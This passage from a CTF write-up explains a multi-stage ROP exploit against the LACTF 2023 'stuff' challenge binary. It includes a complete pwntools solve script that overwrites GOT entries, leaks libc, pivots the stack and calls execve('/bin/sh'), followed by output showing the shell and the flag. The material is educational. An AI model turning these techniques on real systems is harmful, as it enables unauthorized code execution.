rop3.raw(exe.got.puts + 16)  # rbp
# Set rdi with the instructions before the fread call
rop3.raw(fread_gadget)
# Since the puts GOT has been overwritten, we call it by jumping to the second instruction in the puts PLT
rop3.raw(exe.plt.puts + 6)
```

I originally pivoted to the input buffer before calling `fread`, but after seeing other people's solutions I realized that I can just go directly to `fread` and pivot to the buffer when it returns.

## Reading the libc ROP Chain

Now that we have a libc leak, we just need to read in the last part of the ROP chain that uses gadgets from libc to spawn a shell.
The problem is that we only have 32-byte reads and we just filled the input buffer with more than 2048 bytes of junk.
We need to discard all of that junk by doing a read with more than 2048 bytes, otherwise `fread` will read the data that's already in the buffer instead of requesting more data from the OS.

If we can control `rsi`, then we can get `fread` to read as many bytes as we want, since the second argument for `fread` is the size of each of the chunks to read.
I thought that maybe we can reuse the trick where we overwrite the GOT of some function with `pop rbp; ret` to turn a `call` instruction into a `ret` instruction.
I looked at the other function calls in `main` and found this:

<pre><code><span style="color:#005DD0">0x00000000004011b0</span> &lt;+58&gt;:	<span style="color:#26A269">lea    </span><span style="color:#C01C28">rax</span>,[<span style="color:#C01C28">rbp</span><span style="color:#005DD0">-0x4</span>]
<span style="color:#005DD0">0x00000000004011b4</span> &lt;+62&gt;:	<span style="color:#26A269">mov    </span><span style="color:#C01C28">rsi</span>,<span style="color:#C01C28">rax</span>
<span style="color:#005DD0">0x00000000004011b7</span> &lt;+65&gt;:	<span style="color:#26A269">mov    </span><span style="color:#C01C28">edi</span>,<span style="color:#005DD0">0x40202a</span>
<span style="color:#005DD0">0x00000000004011bc</span> &lt;+70&gt;:	<span style="color:#26A269">mov    </span><span style="color:#C01C28">eax</span>,<span style="color:#005DD0">0x0</span>
<span style="color:#005DD0">0x00000000004011c1</span> &lt;+75&gt;:	<span style="color:#26A269">call   </span><span style="color:#005DD0">0x401040</span> &lt;<span style="color:#A2734C">__isoc99_scanf@plt</span>&gt;
</code></pre>

If we overwrite the GOT of `__isoc99_scanf` with `pop rbp; ret`, we can use these instructions to move `rbp - 0x4` into `rsi`.
However, these instructions clobber `rdi`, and the instructions before the call to `fread` that we use to set `rdi` clobber `rsi`, so we can set either `rdi` and `rsi` but not both.
I saw that there is a `mov rdi, rax` gadget right before the call to `fread`, so if we can set `rax` without clobbering `rsi`, then we can set `rsi`, put the value that we want for `rdi` into `rax`, and finally move `rax` into `rdi`.

We can set `rax` by using the overwriting GOT with `pop rbp; ret` trick a third time with these instructions:
<pre><code><span style="color:#005DD0">0x0000000000401192</span> &lt;+28&gt;:	<span style="color:#26A269">mov    </span><span style="color:#C01C28">edi</span>,<span style="color:#005DD0">0x402010</span>
<span style="color:#005DD0">0x0000000000401197</span> &lt;+33&gt;:	<span style="color:#26A269">call   </span><span style="color:#005DD0">0x401080</span> &lt;<span style="color:#A2734C">puts@plt</span>&gt;
...
<span style="color:#005DD0">0x0000000000401207</span> &lt;+145&gt;:	<span style="color:#26A269">mov    </span><span style="color:#C01C28">eax</span>,DWORD PTR [<span style="color:#C01C28">rbp</span><span style="color:#005DD0">-0x4</span>]
<span style="color:#005DD0">0x000000000040120a</span> &lt;+148&gt;:	<span style="color:#26A269">cmp    </span><span style="color:#C01C28">eax</span>,<span style="color:#005DD0">0x2</span>
<span style="color:#005DD0">0x000000000040120d</span> &lt;+151&gt;:	<span style="color:#26A269">jne    </span><span style="color:#005DD0">0x401192</span> &lt;<span style="color:#A2734C">main</span>+28&gt;
</code></pre>

If we overwrite the `puts` GOT with `pop rbp; ret`, then we can jump to `0x401207`, and that will move `[rbp - 0x4]` into `eax`.
As long as the value is not 2, it will jump to `0x401192` and the call to `puts` will act like a `ret`.

We now have all of the pieces that we need for the exploit.
After overwriting the `fread` GOT and leaking libc, we can overwrite the `__isoc99_scanf` and `puts` GOT.
Then we can use the instructions before the `fread` call to set `rcx` and `rdx`, use the instructions before the `scanf` call to set `rsi`, use the instructions before the `puts` call to set `eax`, move `rax` to `rdi`, and finally call `fread` to read in the last part of the ROP chain.

The script to do that looks like this:

```python
# Overwrite GOT again with fread
# Since we overwrote fread GOT earlier, we don't have to stack pivot again
# So we can also overwrite puts GOT with a pop rbp gadget
# The data that will be written is in rop4 below
rop3(rbp=exe.got.setbuf + 16)
rop3.raw(fread_gadget)
rop3.raw(exe.plt.fread + 6)

# Overwrite GOT one last time to overwrite the scanf entry with a pop rbp gadget
# The data that will be written is in rop5
rop3(rbp=exe.got.__isoc99_scanf + 16)
rop3.raw(fread_gadget)
rop3.raw(exe.plt.fread + 6)

# fread, puts, and scanf are now all overwritten with pop rbp
# We now have control over both rdi and rsi

# Call fread with the item size set to 67 to get rid of the junk in the libc stdin buffer and read the final ropchain
# Set rdx and rcx
rop3.raw(fread_gadget)
# Set rsi with the instructions before the scanf call
rop3(rbp=66 + 4)
rop3.raw(rsi_gadget)
# Set rdi to some heap address that we don't care about
# We first set eax and then move the value to rdi to avoid clobbering rsi
# Set eax with the instructions at the end of the loop
# This is 4 + the address of the p32(leak) value at the end of the first half of the payload
rop3(rbp=buffer_addr + 129 + 4)
rop3.raw(eax_gadget)
# Move the value from eax to rdi
rop3.raw(rax_to_rdi_gadget)
# Call fread
rop3.raw(exe.plt.fread + 6)
# Pivot to the final ropchain
rop3(rbp=buffer_addr)
rop3.raw(rop3.find_gadget(["leave", "ret"]))
log.info(rop3.dump())

# Data that will be written in the second GOT overwrite
rop4 = ROP(exe)
rop4.raw(b"BBBBBBBB")
rop4.raw(rop4.find_gadget(["pop rbp", "ret"]))  # fread GOT
rop4.raw(rop4.find_gadget(["pop rbp", "ret"]))  # puts GOT
rop4.raw(b"CCCCCCCC")
log.info(rop4.dump())

# Data that will be written in the third GOT overwrite
rop5 = ROP(exe)
rop5.raw(rop5.find_gadget(["pop rbp", "ret"]))  # scanf GOT
rop5.raw(b"DDDDDDDD")
rop5.raw(b"EEEEEEEE")
rop5.raw(rop5.find_gadget(["pop rbp", "ret"]))  # fread GOT
log.info(rop5.dump())

payload = b"2"
payload += rop1.generatePadding(0, 16)
payload += rop1.chain()
# Data that will be written to GOT
payload += rop2.chain()
payload += rop4.chain()
payload += rop5.chain()
payload += p32(leak)  # Value that will be loaded into eax in order to set rdi without clobbering rsi
payload = payload.ljust(rop3_offset, b"\0")  # Stack space for the functions that we call
payload += rop3.chain()

r.sendafter(b"stuff\n", payload)
```

I set `rsi` to 66 when calling `fread` since 66 * 32 is a little bit bigger than the amount of stuff in the buffer that we need to discard.
I set `rdi` to the leak address since we just need to write the junk to somewhere that we don't care about.

Finally, we can build an `execve` ROP chain with the gadgets in libc and send it:

```python
# Get libc leak
libc.address = int.from_bytes(r.recvline(keepends=False), "little") - libc.symbols.puts
log.info(f"{hex(libc.address)=}")

# Final ropchain utilizing libc
rop6 = ROP([exe, libc])
rop6.raw(b"bbbbbbbb")  # rbp
# Direct execve syscall
rop6(rax=constants.SYS_execve, rdi=next(libc.search(b"/bin/sh\0")), rsi=0, rdx=0)
rop6.raw(rop6.find_gadget(["syscall"]))
log.info(rop6.dump())
r.send(rop6.chain())

r.interactive()
```

Full solve script:

```python
#!/usr/bin/env python3

# Overview:
# Stack pivot to the libc stdin buffer
# Use the fread call at the end of main to overwrite fread GOT with a pop rbp gadget
# This makes the call to fread act like a ret instruction and gives us control over rdi
# Leak libc with puts
# Use fread to overwrite puts GOT with pop rbp
# This can't be done in the first fread call since we have to pivot
# Use fread to overwrite scanf GOT with pop rbp
# Now we can control both rdi and rsi with various fragments of main
# Call fread with a bigger size to get rid of junk in the libc input buffer and read the final ropchain
# Pivot to the final ropchain and execve /bin/sh

from pwn import *

exe = ELF("./stuff")
libc = ELF("./libc.so.6")

context.binary = exe

# r = process([exe.path])
# r = gdb.debug([exe.path])
r = remote("lac.tf", 31182)

# Get heap leak
r.sendlineafter(b"stuff\n", b"1")
r.recvuntil(b"leak: ")
leak = int(r.recvline(keepends=False), 0)
log.info(f"{hex(leak)=}")
# Address of libc stdin buffer
buffer_addr = leak - 0x1010
log.info(f"{hex(buffer_addr)=}")

# Instructions before the call to fread at the end of main, used to overwrite GOT and control rdi
fread_gadget = 0x40120F
# Instructions before the call to scanf, used to control rsi after scanf GOT is overwritten
rsi_gadget = 0x4011B0
# Instructions at the end of the loop before the jump back to puts, used to control eax after puts GOT is overwritten
eax_gadget = 0x401207
# Instruction before the call to fread that moves rax to rdi
rax_to_rdi_gadget = 0x401227
# Number of bytes from the start of the libc input buffer to the second half of the payload
# The gap in the middle is stack space for the functions
rop3_offset = 2048

# Overwrite GOT using the fread call at the end of main and pivot to rop3
rop1 = ROP(exe)
rop1.raw(exe.got.setbuf + 16)  # Set rbp with the leave instruction
rop1.raw(fread_gadget)
log.info(rop1.dump())

# This is the data that will be written to GOT starting with the entry for setbuf
rop2 = ROP(exe)
rop2.raw(b"AAAAAAAA")  # setbuf GOT
rop2.raw(rop2.find_gadget(["pop rbp", "ret"]))  # fread GOT
# Pivot to rop3 using the leave; ret at the end of main
rop2.raw(buffer_addr + rop3_offset)  # rbp
rop2.raw(rop2.find_gadget(["leave", "ret"]))
log.info(rop2.dump())

# fread GOT has been overwritten with a pop rbp gadget, which will pop the return address pushed by the call and return
# So the call to fread now acts like a ret instruction and the instructions before it can be used to control rdi

rop3 = ROP(exe)

# Leak libc by calling puts
rop3.raw(exe.got.puts + 16)  # rbp
# Set rdi with the instructions before the fread call
rop3.raw(fread_gadget)
# Since the puts GOT has been overwritten, we call it by jumping to the second instruction in the puts PLT
rop3.raw(exe.plt.puts + 6)

# Overwrite GOT again with fread
# Since we overwrote fread GOT earlier, we don't have to stack pivot again
# So we can also overwrite puts GOT with a pop rbp gadget
# The data that will be written is in rop4 below
rop3(rbp=exe.got.setbuf + 16)
rop3.raw(fread_gadget)
rop3.raw(exe.plt.fread + 6)

# Overwrite GOT one last time to overwrite the scanf entry with a pop rbp gadget
# The data that will be written is in rop5
rop3(rbp=exe.got.__isoc99_scanf + 16)
rop3.raw(fread_gadget)
rop3.raw(exe.plt.fread + 6)

# fread, puts, and scanf are now all overwritten with pop rbp
# We now have control over both rdi and rsi

# Call fread with the item size set to 67 to get rid of the junk in the libc stdin buffer and read the final ropchain
# Set rdx and rcx
rop3.raw(fread_gadget)
# Set rsi with the instructions before the scanf call
rop3(rbp=66 + 4)
rop3.raw(rsi_gadget)
# Set rdi to some heap address that we don't care about
# We first set eax and then move the value to rdi to avoid clobbering rsi
# Set eax with the instructions at the end of the loop
# This is 4 + the address of the p32(leak) value at the end of the first half of the payload
rop3(rbp=buffer_addr + 129 + 4)
rop3.raw(eax_gadget)
# Move the value from eax to rdi
rop3.raw(rax_to_rdi_gadget)
# Call fread
rop3.raw(exe.plt.fread + 6)
# Pivot to the final ropchain
rop3(rbp=buffer_addr)
rop3.raw(rop3.find_gadget(["leave", "ret"]))
log.info(rop3.dump())

# Data that will be written in the second GOT overwrite
rop4 = ROP(exe)
rop4.raw(b"BBBBBBBB")
rop4.raw(rop4.find_gadget(["pop rbp", "ret"]))  # fread GOT
rop4.raw(rop4.find_gadget(["pop rbp", "ret"]))  # puts GOT
rop4.raw(b"CCCCCCCC")
log.info(rop4.dump())

# Data that will be written in the third GOT overwrite
rop5 = ROP(exe)
rop5.raw(rop5.find_gadget(["pop rbp", "ret"]))  # scanf GOT
rop5.raw(b"DDDDDDDD")
rop5.raw(b"EEEEEEEE")
rop5.raw(rop5.find_gadget(["pop rbp", "ret"]))  # fread GOT
log.info(rop5.dump())

payload = b"2"
payload += rop1.generatePadding(0, 16)
payload += rop1.chain()
# Data that will be written to GOT
payload += rop2.chain()
payload += rop4.chain()
payload += rop5.chain()
payload += p32(leak)  # Value that will be loaded into eax in order to set rdi without clobbering rsi
payload = payload.ljust(rop3_offset, b"\0")  # Stack space for the functions that we call
payload += rop3.chain()

r.sendafter(b"stuff\n", payload)

# Get libc leak
libc.address = int.from_bytes(r.recvline(keepends=False), "little") - libc.symbols.puts
log.info(f"{hex(libc.address)=}")

# Final ropchain utilizing libc
rop6 = ROP([exe, libc])
rop6.raw(b"bbbbbbbb")  # rbp
# Direct execve syscall
rop6(rax=constants.SYS_execve, rdi=next(libc.search(b"/bin/sh\0")), rsi=0, rdx=0)
rop6.raw(rop6.find_gadget(["syscall"]))
log.info(rop6.dump())
r.send(rop6.chain())

r.interactive()
```

Output:

<pre><code>[ctf@fedora-ctf stuff]$ ./solve.py 
[<span style="color:#005DD0"><b>*</b></span>] &apos;/home/ctf/lactf-archive/2023/pwn/stuff/stuff&apos;
    Arch:     amd64-64-little
    RELRO:    <span style="color:#A2734C">Partial RELRO</span>
    Stack:    <span style="color:#C01C28">No canary found</span>
    NX:       <span style="color:#26A269">NX enabled</span>
    PIE:      <span style="color:#C01C28">No PIE (0x400000)</span>
[<span style="color:#005DD0"><b>*</b></span>] &apos;/home/ctf/lactf-archive/2023/pwn/stuff/libc.so.6&apos;
    Arch:     amd64-64-little
    RELRO:    <span style="color:#26A269">Full RELRO</span>
    Stack:    <span style="color:#26A269">Canary found</span>
    NX:       <span style="color:#26A269">NX enabled</span>
    PIE:      <span style="color:#26A269">PIE enabled</span>
[<span style="color:#26A269"><b>+</b></span>] Opening connection to lac.tf on port 31182: Done
[<span style="color:#005DD0"><b>*</b></span>] hex(leak)=&apos;0x1cc6ec0&apos;
[<span style="color:#005DD0"><b>*</b></span>] hex(buffer_addr)=&apos;0x1cc5eb0&apos;
[<span style="color:#005DD0"><b>*</b></span>] Loading gadgets for &apos;/home/ctf/lactf-archive/2023/pwn/stuff/stuff&apos;
[<span style="color:#005DD0"><b>*</b></span>] 0x0000:         0x404040 got.puts
    0x0008:         0x40120f
[<span style="color:#005DD0"><b>*</b></span>] Loaded 5 cached gadgets for &apos;./stuff&apos;
[<span style="color:#005DD0"><b>*</b></span>] 0x0000:      b&apos;AAAAAAAA&apos; b&apos;AAAAAAAA&apos;
    0x0008:         0x40115d pop rbp; ret
    0x0010:        0x1cc66b0
    0x0018:         0x401234 leave; ret
[<span style="color:#005DD0"><b>*</b></span>] 0x0000:         0x404050 stdout
    0x0008:         0x40120f
    0x0010:         0x401086
    0x0018:         0x40115d pop rbp; ret
    0x0020:         0x404040 got.puts
    0x0028:         0x40120f
    0x0030:         0x401076
    0x0038:         0x40115d pop rbp; ret
    0x0040:         0x404030 got.setbuf
    0x0048:         0x40120f
    0x0050:         0x401076
    0x0058:         0x40120f
    0x0060:         0x40115d pop rbp; ret
    0x0068:             0x46
    0x0070:         0x4011b0
    0x0078:         0x40115d pop rbp; ret
    0x0080:        0x1cc5f35
    0x0088:         0x401207
    0x0090:         0x401227
    0x0098:         0x401076
    0x00a0:         0x40115d pop rbp; ret
    0x00a8:        0x1cc5eb0
    0x00b0:         0x401234 leave; ret
[<span style="color:#005DD0"><b>*</b></span>] 0x0000:      b&apos;BBBBBBBB&apos; b&apos;BBBBBBBB&apos;
    0x0008:         0x40115d pop rbp; ret
    0x0010:         0x40115d pop rbp; ret
    0x0018:      b&apos;CCCCCCCC&apos; b&apos;CCCCCCCC&apos;
[<span style="color:#005DD0"><b>*</b></span>] 0x0000:         0x40115d pop rbp; ret
    0x0008:      b&apos;DDDDDDDD&apos; b&apos;DDDDDDDD&apos;
    0x0010:      b&apos;EEEEEEEE&apos; b&apos;EEEEEEEE&apos;
    0x0018:         0x40115d pop rbp; ret
[<span style="color:#005DD0"><b>*</b></span>] hex(libc.address)=&apos;0x7f8d67143000&apos;
[<span style="color:#005DD0"><b>*</b></span>] Loading gadgets for &apos;/home/ctf/lactf-archive/2023/pwn/stuff/libc.so.6&apos;
[<span style="color:#005DD0"><b>*</b></span>] 0x0000:      b&apos;bbbbbbbb&apos; b&apos;bbbbbbbb&apos;
    0x0008:   0x7f8d671ca0c8 pop rax; pop rdx; pop rbx; ret
    0x0010:             0x3b SYS_execve
    0x0018:              0x0
    0x0020:      b&apos;iaaajaaa&apos; &lt;pad rbx&gt;
    0x0028:   0x7f8d6716c3d1 pop rsi; ret
    0x0030:              0x0
    0x0038:   0x7f8d6716aab5 pop rdi; ret
    0x0040:   0x7f8d672da031
    0x0048:   0x7f8d671697b2 syscall
[<span style="color:#005DD0"><b>*</b></span>] Switching to interactive mode
<span style="color:#C01C28"><b>$</b></span> ls
flag.txt
run
<span style="color:#C01C28"><b>$</b></span> cat flag.txt
lactf{old_gcc_hands_out_too_many_free_gadgets_smh}
</code></pre>
